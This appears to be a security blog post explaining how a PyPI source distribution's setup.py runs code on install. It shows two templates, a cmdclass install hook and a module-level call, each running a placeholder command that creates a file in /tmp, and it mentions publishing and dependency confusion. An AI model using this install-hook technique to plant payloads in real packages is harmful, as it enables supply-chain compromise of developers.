---
title: Executing Code on Python Package Installs - Malicious Pypi
date: 2022-09-08T08:39:26-07:00
draft: false
description: How to execute code on a python package install and perform dependency confusion attacks on Pypi
---

<br>

# Foreword

Multiple researchers in the community have given dependency confusion and other supply chain attacks a bad name recently. While there are very valid reasons to perform this attack, please do not pollute pypi or any other package manager with typosquatting, stolen code, or other non-targetted attacks in the name of security research. It's no different than spreading malware. The point has been made. Please be responsible.

# Executing code on package install

While most python packages are distributed as wheels, the ["binary" distribution format](https://packaging.python.org/en/latest/specifications/binary-distribution-format/), Pypi also enables developers to distribute their package as [source distributions](https://packaging.python.org/en/latest/specifications/source-distribution-format/) (or sdist). The sdist allows developers to suply the source code as the distribution such that the code is compiled into a wheel by the distutils/setuptools module on the system that installs it by calling the setup.py script that is bundled into the sdist. This will also occur even if the module if the module is downloaded via `pip download`.

As the setup.py script is supplied by the developer, it is easy to hook parts of distutils and supply your own code instead. Most examples use the built-in `cmdclass` parameter on the setup function to hook a specific command given to setup.py. Here is an example:

```python
from setuptools import setup
from setuptools.command.install import install

def bad_stuff():
    import os
    os.system('touch /tmp/bad_stuff')

class HookedInstallClass(install):
    def run(self):
        install.run(self)
        bad_stuff()

setup(
    name='malicious',
    version='0.0.1',
    description='Execute Code On Install',
    author='Example Author',
    author_email='fake@email.com',
    long_description='',
    long_description_content_type='text/markdown',
    url='https://github.com/pypa/sampleproject',
    packages=[],
    license='GPLv3',
    classifiers=[
        'Environment :: Console',
        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',
        'Operating System :: MacOS :: MacOS X',
        'Operating System :: POSIX',
    ],
    install_requires=[],
    tests_require=[],
    cmdclass={
        'install': HookedInstallClass,
    },
)
```

You can try this out by simply writing it to a setup.py file in a new directory and running `python setup.py install`

Actually bundling and publishing this code is as easy as `python setup.py sdist` and then uploading it via twine. [See the docs here.](https://docs.python.org/3/distutils/setupscript.html) 

# Without hooking

It's also worth noting that although most examples are hooking other functions using cmdclass in the end python is just running the script you supply and you can get as creative with it as you want. You may still want to keep the setup call however if you would like your module to build and install correctly. The following example will execute code every time setup.py is executed, including when you use it to generate the sdist.

```python
from setuptools import setup

def bad_stuff():
    import os
    os.system('touch /tmp/bad_stuff')

setup(
    name='malicious',
    version='0.0.1',
    description='Execute Code On Install',
    author='Example Author',
    author_email='fake@email.com',
    long_description='',
    long_description_content_type='text/markdown',
    url='https://github.com/pypa/sampleproject',
    packages=[],
    license='GPLv3',
    classifiers=[
        'Environment :: Console',
        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',
        'Operating System :: MacOS :: MacOS X',
        'Operating System :: POSIX',
    ],
    install_requires=[],
    tests_require=[],
)

bad_stuff()
```

# Why is this allowed?

> These are useful for end users wanting to develop your sources, and for end user systems where some local compilation step is required (such as a C extension).

There are many use cases where you might want to compile your code differently on a different machine, check attributes of the system, compile other languages, etc.

# Other thoughts

Attacks on package managers are increasingly being considered as low-effort high-reward opportunities for attackers in much the same way that Android apps and Chrome extensions have historically been abused to distribute malware. This is already becoming a popular attack, and package managers are a particularly soft target due to lack of their own anti-malware teams and permission models.

While it is difficult to prevent these attacks from occurring, it should be easy to detect this technique due to the requirements of a package being distributed as a .tar.gz file and the setup.py entry-point. I hope to see more research in this space.

Thanks to [mschwager](https://github.com/mschwager) for his contributions as well, 0wned is a great example.

# Links

<br>

* https://thehackernews.com/2022/09/warning-pypi-feature-executes-code.html
* https://github.com/mschwager/0wned
